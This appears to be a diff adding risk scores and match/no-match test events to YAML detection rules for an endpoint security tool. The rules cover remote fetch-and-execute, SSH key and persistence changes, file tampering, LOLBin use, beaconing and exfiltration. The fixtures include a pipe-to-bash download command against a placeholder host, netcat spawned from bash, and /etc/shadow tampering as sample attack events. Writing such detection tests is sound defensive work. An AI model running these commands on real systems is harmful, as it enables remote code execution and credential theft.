@@ -9,6 +9,7 @@ rules:
     name: "Remote fetch-and-execute process chain"
     description: "Process execution indicates remote download piped to interpreter or reverse shell primitives."
     status: "active"
+    risk_score: 80
     source: "proc_exec"
     false_positives: "Automation scripts that intentionally bootstrap software over trusted channels."
     response: "Validate command origin, parent process lineage, and network destination trust."
@@ -30,6 +31,19 @@ rules:
     condition:
       operator: ">="
       value: 1
+    tests:
+      - name: "remote fetch exec fires"
+        expected: match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", dst_ip: "198.51.100.10", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "remote_fetch_exec", exe_name: "curl", cmdline: "curl -fsSL https://x.test/i.sh | bash"}}
+      - name: "interpreter pattern does not match this rule"
+        expected: no_match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", dst_ip: "198.51.100.10", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "interpreter", exe_name: "python3", cmdline: "python3 app.py"}}
+      - name: "benign exec pattern does not fire"
+        expected: no_match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", dst_ip: "198.51.100.10", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "normal_exec", exe_name: "ls", cmdline: "ls -la"}}
 
   - id: proc_service_shell_child_v1
     name: "Shell spawned by network-facing service"
@@ -61,6 +75,7 @@ rules:
     name: "Suspicious authorized_keys change"
     description: "SSH authorized_keys modified with persistence implications."
     status: "active"
+    risk_score: 76
     source: "ssh_key_change"
     false_positives: "Legitimate key rotations performed by approved IAM workflows."
     response: "Review key diff, actor process lineage, and source account legitimacy."
@@ -82,11 +97,25 @@ rules:
     condition:
       operator: ">="
       value: 1
+    tests:
+      - name: "authorized_keys modify fires"
+        expected: match
+        events:
+          - {event_type: "ssh_key_change", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {action: "modify", path: "/root/.ssh/authorized_keys", path_category: "ssh_authorized_keys"}}
+      - name: "key read access does not fire"
+        expected: no_match
+        events:
+          - {event_type: "ssh_key_change", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {action: "access", path: "/root/.ssh/authorized_keys", path_category: "ssh_authorized_keys"}}
+      - name: "key delete does not fire"
+        expected: no_match
+        events:
+          - {event_type: "ssh_key_change", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {action: "delete", path: "/root/.ssh/authorized_keys", path_category: "ssh_authorized_keys"}}
 
   - id: persistence_systemd_unit_change_v1
     name: "Systemd persistence change"
     description: "Systemd unit or override changed in watched persistence paths."
     status: "active"
+    risk_score: 54
     source: "persistence_systemd"
     false_positives: "Legitimate package upgrades and service rollout actions."
     response: "Validate service delta and ensure change ownership aligns with approved maintenance."
@@ -107,11 +136,25 @@ rules:
     condition:
       operator: ">="
       value: 1
+    tests:
+      - name: "systemd persistence change fires"
+        expected: match
+        events:
+          - {event_type: "persistence_systemd", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {path: "/etc/systemd/system/app.service", path_category: "systemd_unit", action: "modify"}}
+      - name: "fim change does not match systemd rule"
+        expected: no_match
+        events:
+          - {event_type: "fim_change", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {path: "/etc/hosts", path_category: "config_file", action: "modify"}}
+      - name: "process exec does not match systemd rule"
+        expected: no_match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "lolbin", exe_name: "curl"}}
 
   - id: persistence_cron_change_v1
     name: "Cron persistence change"
     description: "Cron path changed in a persistence-sensitive location."
     status: "active"
+    risk_score: 52
     source: "persistence_cron"
     false_positives: "Scheduled maintenance jobs and expected patch automation."
     response: "Compare job command against baseline and validate ownership/mode drift."
@@ -132,11 +175,25 @@ rules:
     condition:
       operator: ">="
       value: 1
+    tests:
+      - name: "cron persistence change fires"
+        expected: match
+        events:
+          - {event_type: "persistence_cron", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {path: "/etc/cron.d/job", path_category: "cron", action: "modify"}}
+      - name: "fim change does not match cron rule"
+        expected: no_match
+        events:
+          - {event_type: "fim_change", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {path: "/etc/hosts", path_category: "config_file", action: "modify"}}
+      - name: "systemd change does not match cron rule"
+        expected: no_match
+        events:
+          - {event_type: "persistence_systemd", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {path: "/etc/systemd/system/app.service", path_category: "systemd_unit", action: "modify"}}
 
   - id: fim_security_tamper_v1
     name: "Security-sensitive file tamper"
     description: "FIM reported tamper on a security-sensitive path."
     status: "active"
+    risk_score: 74
     source: "fim_change"
     false_positives: "Expected configuration hardening or policy updates."
     response: "Confirm authorized change window and inspect actor/process context."
@@ -158,6 +215,19 @@ rules:
     condition:
       operator: ">="
       value: 1
+    tests:
+      - name: "tamper-flagged security file change fires"
+        expected: match
+        events:
+          - {event_type: "fim_change", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {action: "modify", path: "/etc/shadow", path_category: "security_file", tamper_related: true}}
+      - name: "non-tamper change does not fire"
+        expected: no_match
+        events:
+          - {event_type: "fim_change", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {action: "modify", path: "/etc/shadow", path_category: "security_file", tamper_related: false}}
+      - name: "tamper flag on non-fim event does not fire"
+        expected: no_match
+        events:
+          - {event_type: "persistence_cron", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {action: "modify", path: "/etc/cron.d/job", path_category: "cron", tamper_related: true}}
 
   - id: proc_lolbin_exec_v1
     name: "LOLBin pattern process execution"
@@ -195,11 +265,27 @@ rules:
             environments: ["prod", "production"]
           min_events: 1
           condition: {operator: ">=", value: 1}
+    tests:
+      - name: "repeated lolbin execution fires"
+        expected: match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "lolbin", exe_name: "nc", parent_exe_name: "bash"}}
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "lolbin", exe_name: "nc", parent_exe_name: "bash"}}
+      - name: "single lolbin event stays below threshold"
+        expected: no_match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "lolbin", exe_name: "nc", parent_exe_name: "bash"}}
+      - name: "non-lolbin pattern does not fire"
+        expected: no_match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "interpreter", exe_name: "python3", parent_exe_name: "bash"}}
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "interpreter", exe_name: "python3", parent_exe_name: "bash"}}
 
   - id: beacon_suspect_heuristic_v1
     name: "Beaconing heuristic signal"
     description: "Derived beaconing signal from periodic low-jitter outbound intervals. Fires on beacon_suspect events where the heuristic engine confirmed a periodic outbound pattern with sufficient confidence."
     status: "active"
+    risk_score: 56
     source: "beacon_suspect"
     false_positives: "Expected health-check traffic to managed control endpoints with fixed polling intervals."
     response: "Review destination profile, process lineage, and historical interval pattern. Check heuristic_confidence and interval_mean_s in event details for tune-ability."
@@ -222,11 +308,25 @@ rules:
     condition:
       operator: ">="
       value: 1
+    tests:
+      - name: "confident periodic beacon fires"
+        expected: match
+        events:
+          - {event_type: "beacon_suspect", agent_id: "agent-1", dst_ip: "203.0.113.9", dst_port: 443, timestamp: "2026-06-01T00:00:00Z", extra: {heuristic_name: "beacon_periodic_outbound", confidence: 80}}
+      - name: "low confidence beacon does not fire"
+        expected: no_match
+        events:
+          - {event_type: "beacon_suspect", agent_id: "agent-1", dst_ip: "203.0.113.9", dst_port: 443, timestamp: "2026-06-01T00:00:00Z", extra: {heuristic_name: "beacon_periodic_outbound", confidence: 50}}
+      - name: "unrelated heuristic does not fire"
+        expected: no_match
+        events:
+          - {event_type: "beacon_suspect", agent_id: "agent-1", dst_ip: "203.0.113.9", dst_port: 443, timestamp: "2026-06-01T00:00:00Z", extra: {heuristic_name: "jitter_only_signal", confidence: 90}}
 
   - id: exfil_suspect_heuristic_v1
     name: "Exfiltration heuristic signal"
     description: "Derived exfiltration signal from burst outbound bytes to rare destinations."
     status: "active"
+    risk_score: 70
     source: "exfil_suspect"
     false_positives: "Large planned data transfers to new approved destinations."
     response: "Validate data movement purpose and inspect transfer process lineage."
@@ -248,3 +348,16 @@ rules:
     condition:
       operator: ">="
       value: 1
+    tests:
+      - name: "confident exfil burst fires"
+        expected: match
+        events:
+          - {event_type: "exfil_suspect", agent_id: "agent-1", dst_ip: "203.0.113.9", dst_port: 443, timestamp: "2026-06-01T00:00:00Z", extra: {heuristic_name: "exfil_burst_rare_destination", confidence: 88}}
+      - name: "low confidence exfil does not fire"
+        expected: no_match
+        events:
+          - {event_type: "exfil_suspect", agent_id: "agent-1", dst_ip: "203.0.113.9", dst_port: 443, timestamp: "2026-06-01T00:00:00Z", extra: {heuristic_name: "exfil_burst_rare_destination", confidence: 50}}
+      - name: "beacon event does not match exfil rule"
+        expected: no_match
+        events:
+          - {event_type: "beacon_suspect", agent_id: "agent-1", dst_ip: "203.0.113.9", dst_port: 443, timestamp: "2026-06-01T00:00:00Z", extra: {heuristic_name: "beacon_periodic_outbound", confidence: 88}}
